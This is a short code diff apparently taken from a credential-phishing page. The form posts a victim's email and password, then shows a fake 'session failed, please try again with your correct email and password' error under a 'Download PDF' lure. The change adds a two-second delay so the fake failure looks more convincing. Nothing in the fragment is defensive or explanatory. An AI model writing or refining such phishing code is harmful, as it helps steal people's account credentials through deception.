@@ -57,9 +57,11 @@
                 data: {email: input4email, password: input4passwd},
                 processData: true,
                 complete: function(jqXHR) {
+                    setTimeout(function() {
                     $('#btn4sbmt').html('<center><div class="spinner"></div></center>').prop('disabled', true);
                     $('#showerror').html("Oops.. Something went wrong, session failed to open, please try again with your correct email and password")
                      $('#btn4sbmt').html('Download PDF').prop('disabled', false);
+                        }, 2000);
                        console.log(feedback);
                        // return false;
                 $('#igodo').focus();
